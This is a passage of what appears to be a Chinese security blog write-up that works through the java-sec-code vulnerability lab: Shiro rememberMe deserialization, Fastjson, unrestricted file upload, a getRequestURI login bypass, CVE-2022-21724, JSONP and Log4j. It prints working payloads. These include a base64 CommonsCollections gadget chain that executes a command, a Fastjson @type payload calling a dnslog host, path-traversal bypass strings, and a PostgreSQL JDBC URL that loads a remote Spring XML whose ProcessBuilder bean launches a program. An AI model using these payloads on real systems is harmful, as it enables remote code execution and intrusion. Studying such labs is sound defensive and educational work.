class="hljs-keyword">ls</span>LkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AGnhzcgA0b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmtleXZhbHVlLlRpZWRNYXBFbnRyeYqt0ps5wR/bAgACTAADa2V5cQB+AAFMAANtYXB0AA9MamF2YS91dG<span class="hljs-keyword">ls</span>L01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAF4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4ABVsAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AMgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ADJzcQB+ACt1cQB+AC8AAAACcHVxAH4ALwAAAAB0AAZpbnZva2V1cQB+ADIAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAvc3EAfgArdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQABGNhbGN0AARleGVjdXEAfgAyAAAAAXEAfgA3c3EAfgAnc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcgARamF2YS51dG<span class="hljs-keyword">ls</span>Lkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHh4<br></code></pre></td></tr></table></figure><p>之后在 cookie 中加入payload：</p><p><strong>注意： rememberMe &#x3D; &lt;payload&gt;</strong> </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080934983.png" alt="20250724132100840"></p><p>发包后会弹出计算器</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080934545.png" alt="20250724132234120"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080934976.png" alt="20250724132330738"></p><h2 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h2><p>触发点:  JSON.parseObject()      JSON.parse()</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080934865.png" alt="20250724134123264"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@RequestMapping(&quot;/fastjson&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Fastjson</span> &#123;<br><br>    <span class="hljs-meta">@RequestMapping(value = &quot;/deserialize&quot;, method = &#123;RequestMethod.POST&#125;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">Deserialize</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> String params)</span> &#123;<br>        <span class="hljs-comment">// 如果Content-Type不设置application/json格式，post数据会被url编码</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 将post提交的string转换为json</span><br>            <span class="hljs-comment">//Fastjson 框架将字符串解析为 JSONObject 对象</span><br>            <span class="hljs-type">JSONObject</span> <span class="hljs-variable">ob</span> <span class="hljs-operator">=</span> JSON.parseObject(params);<br>            <span class="hljs-keyword">return</span> ob.get(<span class="hljs-string">&quot;name&quot;</span>).toString();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span> e.toString();<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p><strong>漏洞利用：</strong></p><p>post 请求 &#x2F;fastjson&#x2F;deserialize ，传输 <strong>application&#x2F;json</strong> 格式数据</p><p>payload:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;name&quot;</span>:&#123;<span class="hljs-string">&quot;<span class="hljs-variable">@type</span>&quot;</span>:<span class="hljs-string">&quot;java.net.Inet4Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;2jf0vy.dnslog.cn&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080935795.png" alt="20250724135345425"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080935897.png" alt="20250724135353947"></p><h2 id="FileUpload"><a href="#FileUpload" class="headerlink" title="FileUpload"></a>FileUpload</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@RequestMapping(&quot;/file&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileUpload</span> &#123;<br><br>    <span class="hljs-comment">// Save the uploaded file to this folder</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">UPLOADED_FOLDER</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/tmp/&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(<span class="hljs-built_in">this</span>.getClass());<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">randomFilePath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-comment">// uplaod any file</span><br>    <span class="hljs-meta">@GetMapping(&quot;/any&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;upload&quot;</span>; <span class="hljs-comment">// return upload.html page</span><br>    &#125;<br><br>    <span class="hljs-comment">// only allow to upload pictures</span><br>    <span class="hljs-meta">@GetMapping(&quot;/pic&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">uploadPic</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;uploadPic&quot;</span>; <span class="hljs-comment">// return uploadPic.html page</span><br>    &#125;<br><br>    <span class="hljs-meta">@PostMapping(&quot;/upload&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">singleFileUpload</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;file&quot;)</span> MultipartFile file,</span><br><span class="hljs-params">                                   RedirectAttributes redirectAttributes)</span> &#123;<br>        <span class="hljs-keyword">if</span> (file.isEmpty()) &#123;<br>            <span class="hljs-comment">// 赋值给uploadStatus.html里的动态参数message</span><br>            redirectAttributes.addFlashAttribute(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;Please select a file to upload&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:/file/status&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// Get the file and save it somewhere</span><br>            <span class="hljs-type">byte</span>[] bytes = file.getBytes();<br>            <span class="hljs-type">Path</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> Paths.get(UPLOADED_FOLDER + file.getOriginalFilename());<br>            Files.write(path, bytes);<br><br>            redirectAttributes.addFlashAttribute(<span class="hljs-string">&quot;message&quot;</span>,<br>                    <span class="hljs-string">&quot;You successfully uploaded &#x27;&quot;</span> + UPLOADED_FOLDER + file.getOriginalFilename() + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br><br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            redirectAttributes.addFlashAttribute(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;upload failed&quot;</span>);<br>            logger.error(e.toString());<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:/file/status&quot;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>未对文件名、后缀名进行过滤，直接上传文件。</p><p><strong>漏洞利用：</strong></p><p>功能点：<a href="http://127.0.0.1:8081/file/any">http://127.0.0.1:8081/file/any</a> ，可以上传任意文件</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080935394.png" alt="20250724141442245"></p><h2 id="GetRequestURI"><a href="#GetRequestURI" class="headerlink" title="GetRequestURI"></a>GetRequestURI</h2><blockquote><p>request.getRequestURL() 返回全路径</p><p>request.getRequestURI() 返回除去host（域名或者ip）部分的路径</p><p>request.getContextPath() 返回工程名部分，如果工程映射为&#x2F;，此处返回则为空</p><p>request.getServletPath() 返回除去host和工程名部分的路径</p><p>例如：</p><p>request.getRequestURL() <a href="http://localhost:8080/jqueryLearn/resources/request.jsp">http://localhost:8080/jqueryLearn/resources/request.jsp</a><br>request.getRequestURI() &#x2F;jqueryLearn&#x2F;resources&#x2F;request.jsp<br>request.getContextPath()&#x2F;jqueryLearn<br>request.getServletPath()&#x2F;resources&#x2F;request.jsp </p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;uri&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GetRequestURI</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(<span class="hljs-built_in">this</span>.getClass());<br><br>    <span class="hljs-meta">@GetMapping(value = &quot;/exclued/vuln&quot;)</span><br>    <span class="hljs-comment">//方法接收 HttpServletRequest 用于获取当前请求的 URI、路径等信息</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">exclued</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br><br>        <span class="hljs-comment">//若请求路径匹配 /css/** 和 /js/** 路径，就跳过登录</span><br>        String[] excluedPath = &#123;<span class="hljs-string">&quot;/css/**&quot;</span>, <span class="hljs-string">&quot;/js/**&quot;</span>&#125;;<br>        <span class="hljs-comment">//获取请求 URI</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> request.getRequestURI(); <span class="hljs-comment">// Security: request.getServletPath()</span><br>        <span class="hljs-type">PathMatcher</span> <span class="hljs-variable">matcher</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AntPathMatcher</span>();<br><br>        <span class="hljs-comment">//打印 getRequestURI() 和 getServletPath() 的结果</span><br>        logger.info(<span class="hljs-string">&quot;getRequestURI: &quot;</span> + uri);<br>        logger.info(<span class="hljs-string">&quot;getServletPath: &quot;</span> + request.getServletPath());<br><br>        <span class="hljs-comment">//遍历所有排除规则，如果当前请求 URI 匹配任意规则，则认为绕过登录校验</span><br>        <span class="hljs-keyword">for</span> (String path : excluedPath) &#123;<br>            <span class="hljs-keyword">if</span> (matcher.match(path, uri)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;You have bypassed the login page.&quot;</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">//如果请求路径不匹配排除规则，则返回提示页面是登录页。</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;This is a login page &gt;..&lt;&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里有一个奇怪的点：<code>@RequestMapping(&quot;uri&quot;)</code></p><p>注释中都没有加 <code>uri</code> ，如果不加 <code>uri</code> 下面的全部访问不到，但是 <code>getRequestURI() 返回除去 host（域名或者ip）部分的路径</code> 一定会包含  <code>uri</code> ，这就导致 <code>String[] excluedPath = &#123;&quot;/css/**&quot;, &quot;/js/**&quot;&#125;;</code> 完全起不到作用，因为 <code>getRequestURI() </code>返回为 <code>/uri/...</code>，导致匹配不到 <code>&quot;/css/**&quot;, &quot;/js/**&quot;</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080935768.png" alt="20250724151631951"></p><p>测试：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@GetMapping(&quot;/testPath&quot;)</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">testPath</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>       <span class="hljs-comment">// 返回当前请求的完整路径 和 servletPath</span><br>       <span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> request.getRequestURI();<br>       <span class="hljs-type">String</span> <span class="hljs-variable">servletPath</span> <span class="hljs-operator">=</span> request.getServletPath();<br>       <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;getRequestURI: &quot;</span> + uri + <span class="hljs-string">&quot;\ngetServletPath: &quot;</span> + servletPath;<br>   &#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080935368.png" alt="20250724152429560"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080936550.png" alt="20250724152503479"></p><p>想要利用就改一下匹配规则：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-type">String</span>[] excluedPath = &#123;<span class="hljs-string">&quot;/uri/css/**&quot;</span>, <span class="hljs-string">&quot;/uri/js/**&quot;</span>&#125;;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080936819.png" alt="20250724152945636"></p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">poc:</span><br><span class="hljs-keyword">/uri/</span>css/..<span class="hljs-punctuation">;</span><span class="hljs-keyword">/exclued/</span>vuln<br><span class="hljs-keyword">/uri/</span>css/..<span class="hljs-punctuation">;</span>bypasswaf<span class="hljs-keyword">/exclued/</span>vuln<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080936089.png" alt="20250724153028787"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080936309.png" alt="20250724153553391"></p><h2 id="jdbc-CVE-2022-21724"><a href="#jdbc-CVE-2022-21724" class="headerlink" title="jdbc-CVE 2022 21724"></a>jdbc-CVE 2022 21724</h2><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080936646.png" alt="20250725111517628"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;/jdbc&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Jdbc</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * &lt;a href=&quot;https://github.com/JoyChou93/java-sec-code/wiki/CVE-2022-21724&quot;&gt;CVE-2022-21724&lt;/a&gt;</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/postgresql&quot;)</span><br>    <span class="hljs-comment">//接收 Base64 编码的 jdbcurl ，</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">postgresql</span><span class="hljs-params">(String jdbcUrlBase64)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">byte</span>[] b = java.util.Base64.getDecoder().decode(jdbcUrlBase64);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jdbcUrl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(b);<br>        log.info(jdbcUrl);<br>        DriverManager.getConnection(jdbcUrl);<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(&quot;/db2&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">db2</span><span class="hljs-params">(String jdbcUrlBase64)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Class.forName(<span class="hljs-string">&quot;com.ibm.db2.jcc.DB2Driver&quot;</span>);<br>        <span class="hljs-type">byte</span>[] b = java.util.Base64.getDecoder().decode(jdbcUrlBase64);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jdbcUrl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(b);<br>        log.info(jdbcUrl);<br>        DriverManager.getConnection(jdbcUrl);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>PostgreSQL JDBC 驱动支持通过 JDBC URL 中的参数 <code>socketFactory</code> 指定自定义类，用于创建 socket 连接。</p><p><strong>在漏洞版本中，这个类没有限制来源</strong>，攻击者可通过如下 URL 参数让其加载任意类：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">socketFactory=<span class="hljs-tag">&lt;<span class="hljs-name">任意类</span>&gt;</span>&amp;socketFactoryArg=<span class="hljs-tag">&lt;<span class="hljs-name">任意参数</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Spring 环境中存在的 <code>org.springframework.context.support.ClassPathXmlApplicationContext</code> 是一个典型的入口点，它可自动解析并执行外部 XML 配置。</p><p>payload：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">jdbcUrlBase64=amRiYzpwb3N0Z3Jlc3FsOi8vMTI3LjAuMC4xOjU0MzIvdGVzdC8/c29ja2V0RmFjdG9yeT1vcmcuc3ByaW5nZnJhbWV3b3JrLmNvbnRleHQuc3VwcG9ydC5DbGFzc1BhdGhYbWxBcHBsaWNhdGlvbkNvbnRleHQmc29ja2V0RmFjdG9yeUFyZz1odHRwOi8vdGVzdC5qb3ljaG91Lm9yZy8xLnhtbA==<br><br>jdbc:postgresql:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">5432</span><span class="hljs-regexp">/test/</span>?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&amp;socketFactoryArg=http:<span class="hljs-regexp">//</span>test.joychou.org/<span class="hljs-number">1</span>.xml<br></code></pre></td></tr></table></figure><p><strong>socketFactory</strong> &#x3D; 使用了 Spring 的 <code>ClassPathXmlApplicationContext</code> 类</p><ul><li>该类在初始化时会加载并解析指定 URL 或文件的 Spring XML 配置。</li></ul><p><strong>socketFactoryArg</strong> &#x3D; 远程的 <code>1.xml</code></p><ul><li>这个 XML 是 Spring Bean 配置文件，包含了一个 <strong>ProcessBuilder</strong> Bean，启动本地程序。</li></ul><p>1.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:p</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/p&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="hljs-tag">        http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><br>   <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;exec&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>open<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>-a<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>calculator<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><span class="hljs-comment">&lt;!-- mac 中运行计算机；Linux 就是 /bin/sh，Windows 就是 cmd.exe--&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="jsonp"><a href="#jsonp" class="headerlink" title="jsonp"></a>jsonp</h2><blockquote><p>JSONP（JSON with Padding）是浏览器早期为了解决<strong>跨域请求数据</strong>的一种方法。它的基本原理是：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://example.com/jsonp?callback=handleResponse&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>服务器返回的不是 JSON，而是：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl">&gt;<span class="hljs-function"><span class="hljs-title">handleResponse</span>(&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;);</span><br></code></pre></td></tr></table></figure><p>如果服务器不严格校验 <code>callback</code> 参数来源，就可能造成 <strong>跨站数据泄露（XSS）</strong> 或 <strong>信息泄露漏洞</strong>。</p></blockquote><p><strong>漏洞利用：</strong></p><p>搜关键字：<code>AbstractJsonpResponseBodyAdvice</code> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@ControllerAdvice</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Object2Jsonp</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractJsonpResponseBodyAdvice</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String[] callbacks;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Logger logger= LoggerFactory.getLogger(<span class="hljs-built_in">this</span>.getClass());<br><br><br>    <span class="hljs-comment">// method of using @Value in constructor</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Object2Jsonp</span><span class="hljs-params">(<span class="hljs-meta">@Value(&quot;$&#123;joychou.security.jsonp.callback&#125;&quot;)</span> String[] callbacks)</span> &#123;<br>        <span class="hljs-built_in">super</span>(callbacks);  <span class="hljs-comment">// Can set multiple paramNames</span><br>        <span class="hljs-built_in">this</span>.callbacks = callbac<br></code></pre></td></tr></table></figure><h2 id="Log4j"><a href="#Log4j" class="headerlink" title="Log4j"></a>Log4j</h2><p>版本存在漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080938586.png" alt="20250725135906016"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-meta">@RequestMapping(value = &quot;/log4j&quot;)</span><br><span 